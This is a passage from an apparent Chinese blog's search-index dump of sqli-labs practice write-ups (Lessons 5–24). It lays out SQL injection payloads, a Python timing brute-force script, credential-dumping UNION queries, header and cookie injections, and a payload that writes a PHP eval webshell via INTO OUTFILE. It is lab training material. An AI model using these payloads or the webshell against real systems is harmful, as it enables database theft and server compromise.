table_name='users'),1,1))\u003e99--+ //判断字段内容长度 ?id=1' and length((select group_concat(username,password) from users))\u003e109--+ //逐一检测内容 ?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))\u003e50--+ 基于时间盲注sleep()函数 id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- # 当正确时无明显延迟,错误有明显延迟 benchmark () 函数 id=1' UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- # script # coding:utf-8 import requests import datetime import time # 获取数据库名长度 def database_len(): for i in range(1, 10): url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \" ?id=1' and if(length(database())\u003e%s,sleep(1),0) --+\" % i # print(url+payload+'%23') time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e= 1: print(i) else: print(i) break print('database_len:', i) #获取数据库名 def database_name(): name = '' for j in range(1,9): for i in '0123456789abcdefghijklmnopqrstuvwxyz': url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \"?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+\" % (j,i) #print(url+payload) time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e=3: name += i print(name) break print('database_name:', name) if __name__ == '__main__': database_name() xpath注入 mysql\u003e updatexml(1,concat(0x5e,database(),0x5e),1); ERROR 1105 (HY000): XPATH syntax error: '^security^' payload ?id=1' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#基于时间盲注"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-5 GET - Double Injection - Single Quotes - String双注入GET单引号字符型注入 vul $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; ... print_r(mysql_error()); payload 基于报错注入 //判断数据库的长度 ?id=1'and length((select database()))\u003e9--+ //截取判断对应字符 //substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。 ?id=1'and ascii(substr((select database()),1,1))=115--+ //判断所有表名字符长度 ?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u003e13--+ //逐一判断表名 ?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u003e99--+ //判断所有字段名的长度 ?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))\u003e20--+ //逐一判断字段名 ?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))\u003e99--+ //判断字段内容长度 ?id=1' and length((select group_concat(username,password) from users))\u003e109--+ //逐一检测内容 ?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))\u003e50--+ 基于时间盲注sleep()函数 id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- # 当正确时无明显延迟,错误有明显延迟 benchmark () 函数 id=1' UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- # script # coding:utf-8 import requests import datetime import time # 获取数据库名长度 def database_len(): for i in range(1, 10): url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \" ?id=1' and if(length(database())\u003e%s,sleep(1),0) --+\" % i # print(url+payload+'%23') time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e= 1: print(i) else: print(i) break print('database_len:', i) #获取数据库名 def database_name(): name = '' for j in range(1,9): for i in '0123456789abcdefghijklmnopqrstuvwxyz': url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \"?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+\" % (j,i) #print(url+payload) time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e=3: name += i print(name) break print('database_name:', name) if __name__ == '__main__': database_name() xpath注入 mysql\u003e updatexml(1,concat(0x5e,database(),0x5e),1); ERROR 1105 (HY000): XPATH syntax error: '^security^' payload ?id=1' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#xpath注入"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-6 GET - Double Injection - Double Quotes - String双注入GET双引号字符型注入 vul $id=$_GET['id']; ... $id = '\"'.$id.'\"'; ... $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; ... print_r(mysql_error()); bypass ?id=1\"and length((select database()))\u003e9--+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:6","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-6-get---double-injection---double-quotes---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-7 GET - Dump into outfile - String导出文件GET字符型注入 vul $id=$_GET['id']; ... $sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\"; bypass ?id=1')) and length((select database()))\u003e9--+ 但需要网站的绝对路径 //@@datadir输出数据库中数据的存放路径 ?id=-1' union select 1,2,@@datadir--+ //得到Your Password:D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\ 利用 into outfile 导出文件 //需要修改my.ini secure_file_priv的值为null时,表示限制mysql不允许导入,导出 secure_file_priv的值为/tmp/,表示限制mysql的导入,导出只能发生在/tmp/目录下 secure_file_priv的值没有具体的值\"\"时表示不对mysql的导入导出做出限制 将数据库里面的信息导出到文件中 ?id=-1')) union select * from security.users into outfile \"D:\\\\phpstudy_pro\\\\WWW\\\\other\\\\sqli-labs\\\\Less-7\\\\users.txt\" --+ 也可以写进webshell ?id=-1')) union select 1,2,\"\u003c?php @eval($_POST['aaa']);?\u003e\" into outfile \"D:\\\\phpstudy_pro\\\\WWW\\\\other\\\\sqli-labs\\\\Less-7\\\\shell.php\" --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-7-get---dump-into-outfile---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-8 GET - Blind - Boolian Based - Single Quotes布尔型单引号GET盲注 vul $id=$_GET['id']; $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; bypass ?id=1' and if(ascii(substr(database(),1,1))\u003e1,sleep(5),sleep(1)) --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:8","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-8-get---blind---boolian-based---single-quotes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-9 GET - Blind - Time based. - Single Quotes基于时间的GET单引号盲注 bypass ?id=1' and if(ascii(substr(database(),1,1))\u003e1,sleep(5),sleep(1)) --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:9","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-9-get---blind---time-based---single-quotes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-10 GET - Blind - Time based - double quotes基于时间的双引号盲注 vul $id=$_GET['id']; $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; bypass ?id=1\" and if(ascii(substr(database(),1,1))\u003e1,sleep(5),sleep(1)) --+ 盲注截取函数mid() mid(column_name,start,length) column_nmae:需要提取的字符字段 start:规定开始的位置 length:要返回的字段数 mid(database(),1,1)\u003e'a':查看数据库名的第一位 substr () 与 substring () substr()和substring()函数实现的功能是一样的 string substring(string,start,length) string substr(string,start,length) 参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度 left() left()得到字符串左部指定个数的字符串 left(string,n) string为要截取的字符串,n为长度 编码函数ord() 返回第一个字符的ascii码 判断database()的第一位ascii码是否大于114： ord(mid(database(),1,1))\u003e114 ascii() 将某个字符转换为 ascii 值 ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:10","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-10-get---blind---time-based---double-quotes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-10 GET - Blind - Time based - double quotes基于时间的双引号盲注 vul $id=$_GET['id']; $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; bypass ?id=1\" and if(ascii(substr(database(),1,1))\u003e1,sleep(5),sleep(1)) --+ 盲注截取函数mid() mid(column_name,start,length) column_nmae:需要提取的字符字段 start:规定开始的位置 length:要返回的字段数 mid(database(),1,1)\u003e'a':查看数据库名的第一位 substr () 与 substring () substr()和substring()函数实现的功能是一样的 string substring(string,start,length) string substr(string,start,length) 参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度 left() left()得到字符串左部指定个数的字符串 left(string,n) string为要截取的字符串,n为长度 编码函数ord() 返回第一个字符的ascii码 判断database()的第一位ascii码是否大于114： ord(mid(database(),1,1))\u003e114 ascii() 将某个字符转换为 ascii 值 ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:10","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#盲注截取函数"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-10 GET - Blind - Time based - double quotes基于时间的双引号盲注 vul $id=$_GET['id']; $id = '\"'.$id.'\"'; $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; bypass ?id=1\" and if(ascii(substr(database(),1,1))\u003e1,sleep(5),sleep(1)) --+ 盲注截取函数mid() mid(column_name,start,length) column_nmae:需要提取的字符字段 start:规定开始的位置 length:要返回的字段数 mid(database(),1,1)\u003e'a':查看数据库名的第一位 substr () 与 substring () substr()和substring()函数实现的功能是一样的 string substring(string,start,length) string substr(string,start,length) 参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度 left() left()得到字符串左部指定个数的字符串 left(string,n) string为要截取的字符串,n为长度 编码函数ord() 返回第一个字符的ascii码 判断database()的第一位ascii码是否大于114： ord(mid(database(),1,1))\u003e114 ascii() 将某个字符转换为 ascii 值 ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:10","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#编码函数"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录11-17 ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-11 POST - Error Based - Single quotes- String基于错误的POST型单引号字符型注入 万能密码 uname=1' or 1=1# \u0026 passwd=1 bypass uname=-1' union select 1,database() # \u0026 passwd=1 uname=-1' union select 1,group_concat(schema_name) from information_schema.schemata # \u0026 passwd=1 uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# \u0026 passwd=1 uname=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'# \u0026 passwd=1 uname=-1' union select 1,group_concat(username,\"|||\",password) from users# \u0026 passwd=1 ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-11-post---error-based---single-quotes--string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-12 POST - Error Based - Double quotes- String-with twist基于错误的双引号POST型字符型变形的注入 bypass uname=admin\" \u0026 passwd=admin ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-12-post---error-based---double-quotes--string-with-twist"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-13 POST - Double Injection - Single quotes- String -twistPOST单引号变形双注入 bypass uname=admin') \u0026 passwd=admin ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-13-post---double-injection---single-quotes--string--twist"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-14 POST - Double Injection - Single quotes- String -twistPOST单引号变形双注入 bypass uname=admin\" \u0026 passwd=admin ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-14-post---double-injection---single-quotes--string--twist"},{"categories":["web","wp","sqli-labs"],"content":"\rless-15 POST - Blind- Boolian/time Based - Single quotes基于bool型/时间延迟单引号POST型盲注 源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。 bypass uname=admin' \u0026 passwd=admin ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-15-post---blind--booliantime-based---single-quotes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-16 POST - Blind- Boolian/Time Based - Double quotes基于bool型/时间延迟的双引号POST型盲注 bypass uname=admin\") \u0026 passwd=admin ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:6","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-16-post---blind--booliantime-based---double-quotes"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-17 POST - Update Query- Error Based - String基于错误的更新查询POST注入 审计后端代码，发现uname被check_input包裹了 //making sure uname is not injectable $uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; ... $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; print_r(mysql_error()); 注入点是在 update 语句里面，输出了报错日志 子查询注入 //查用户名 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # //查数据库 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # updatexml()函数updatexml 最大爆 32 个字符 uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(database())),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),1) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0) -- # extractvalue()函数 uname=Dumb\u0026passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- # ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#less-17-post---update-query--error-based---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-17 POST - Update Query- Error Based - String基于错误的更新查询POST注入 审计后端代码，发现uname被check_input包裹了 //making sure uname is not injectable $uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; ... $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; print_r(mysql_error()); 注入点是在 update 语句里面，输出了报错日志 子查询注入 //查用户名 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # //查数据库 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # updatexml()函数updatexml 最大爆 32 个字符 uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(database())),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),1) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0) -- # extractvalue()函数 uname=Dumb\u0026passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- # ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#子查询注入"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-17 POST - Update Query- Error Based - String基于错误的更新查询POST注入 审计后端代码，发现uname被check_input包裹了 //making sure uname is not injectable $uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; ... $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; print_r(mysql_error()); 注入点是在 update 语句里面，输出了报错日志 子查询注入 //查用户名 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # //查数据库 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # updatexml()函数updatexml 最大爆 32 个字符 uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(database())),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),1) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0) -- # extractvalue()函数 uname=Dumb\u0026passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- # ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#updatexml函数"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-17 POST - Update Query- Error Based - String基于错误的更新查询POST注入 审计后端代码，发现uname被check_input包裹了 //making sure uname is not injectable $uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; ... $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; print_r(mysql_error()); 注入点是在 update 语句里面，输出了报错日志 子查询注入 //查用户名 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # //查数据库 uname=Dumb\u0026passwd=1' or (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- # updatexml()函数updatexml 最大爆 32 个字符 uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(database())),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),1) -- # uname=Dumb\u0026passwd=1' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0) -- # extractvalue()函数 uname=Dumb\u0026passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- # ","date":"2023-11-17","objectID":"/sqli-labs_2_post/:0:7","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(2)POST","uri":"/sqli-labs_2_post/#extractvalue函数"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录18-22 ","date":"2023-11-17","objectID":"/sqli-labs_3_post_head/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(3)POST头部注入","uri":"/sqli-labs_3_post_head/#"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-18 POST - Header Injection - Uagent field - Error based基于错误的用户代理，头部POST注入 $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); ... $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; 注入点在insert 语句，未对 uagent 和 ip_address 进行过滤，并且输出报错信息 PHP 里用来获取客户端 IP 的变量 $_SERVER['HTTP_CLIENT_IP'] 很少使用，客户端可以伪造。 $_SERVER['HTTP_X_FORWARDED_FOR']，客户端可以伪造。 $_SERVER['REMOTE_ADDR']，客户端不能伪造。 这里的IP无法伪造，故通过user-agent来进行注入 payload:爆数据库 POST /Less-18/ HTTP/1.1 Host: 127.0.0.1:8888 User-Agent: ' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ' Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1:8888/Less-18/ Content-Type: application/x-www-form-urlencoded Content-Length: 38 Connection: close Upgrade-Insecure-Requests: 1 uname=admin\u0026passwd=admin\u0026submit=Submit 这里不使用注释符 $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; uagent 是在 IP 和 uname 之前的，如果注释掉后面的语句，会导致 Insert 语句异常 extractvalue()函数 爆表: ' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and ' 爆列名： ' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'))) and ' 爆列名： ' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'))) and ' ' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelinal')))) and ' updatexml()函数 数据库: ' or updatexml(1,concat('#',(database())),0),' ',' ')-- # ' and updatexml(1,concat('#',(database())),0),' ',' ')-- # 爆表： ' or updatexml(1,concat('#',(select group_concat(table_name) from information_schema.tables where table_schema='security')),0),'','')# 爆字段 ' and updatexml(1,concat('#',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),0),'','')-- # 爆数据： ' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0),'','')-- # 使用limit偏移注入依次爆出其他用户和密码。 ","date":"2023-11-17","objectID":"/sqli-labs_3_post_head/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(3)POST头部注入","uri":"/sqli-labs_3_post_head/#less-18-post---header-injection---uagent-field---error-based"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-19 POST - Header Injection - Referer field - Error based基于头部的Referer POST报错注入 $uagent = $_SERVER['HTTP_REFERER']; $IP = $_SERVER['REMOTE_ADDR']; ... $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); ... $insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\"; mysql_query($insert); ... echo 'Your Referer is: ' .$uagent; 注入点在referer，payload同上题 ","date":"2023-11-17","objectID":"/sqli-labs_3_post_head/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(3)POST头部注入","uri":"/sqli-labs_3_post_head/#less-19-post---header-injection---referer-field---error-based"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-20 POST - Cookie injections - Uagent field - Error based基于错误的cookie头部POST注入 $cookee = $_COOKIE['uname']; ... echo \"YOUR COOKIE : uname = $cookee and expires: \" . date($format, $timestamp); ... $sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\"; ... print_r(mysql_error()); payload GET /Less-20/ HTTP/1.1 Host: 192.168.131.1:1111 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Cookie: uname=-admin' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ Accept-Language: zh-CN,zh;q=0.9 Connection: close ","date":"2023-11-17","objectID":"/sqli-labs_3_post_head/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(3)POST头部注入","uri":"/sqli-labs_3_post_head/#less-20-post---cookie-injections---uagent-field---error-based"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-21 Cookie Injection- Error Based- complex - string基于 base64 编码单引号和括号的 Cookie 注入 vul $cookee = $_COOKIE['uname']; ... echo \"YOUR COOKIE : uname = $cookee and expires: \" . date($format, $timestamp); ... $cookee = base64_decode($cookee); echo \"\u003cbr\u003e\u003c/font\u003e\"; $sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\"; 注入点在cookie，但经过base64编码了 payload GET /Less-21/ HTTP/1.1 Host: 127.0.0.1:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj Connection: close Upgrade-Insecure-Requests: 1 ","date":"2023-11-17","objectID":"/sqli-labs_3_post_head/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(3)POST头部注入","uri":"/sqli-labs_3_post_head/#less-21-cookie-injection--error-based--complex---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-22 Cookie Injection- Error Based- Double Quotes - string基于错误的双引号字符型Cookie注入 bypass 改双引号闭合 payload GET /Less-22/ HTTP/1.1 Host: 127.0.0.1:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: uname=MSIgb3IgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSktLSAj Connection: close Upgrade-Insecure-Requests: 1 ","date":"2023-11-17","objectID":"/sqli-labs_3_post_head/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(3)POST头部注入","uri":"/sqli-labs_3_post_head/#less-22-cookie-injection--error-based--double-quotes---string"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录23-31 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-23 GET - Error based - strip comments基于错误的，过滤注释的GET型 注释符号被过滤了 bypass ?id=1' or '1'='1 payload ?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1 ?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1 ?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1 ","date":"2023-11-17","objectID":"/sqli-labs_4_bypass/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(4)绕过","uri":"/sqli-labs_4_bypass/#less-23-get---error-based---strip-comments"},{"categories":["web","wp","sqli-labs"],"content":"\rLess - 24 Second Degree Injections Real treat -Store Injections二次注入 #login.php function sqllogin(){ $username = mysql_real_escape_string($_POST[\"login_user\"]); $password = mysql_real_escape_string($_POST[\"login_password\"]); $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; ... $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); #pass_change.php $username= $_SESSION[\"username\"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass) { $sql = \"UPDATE users SET 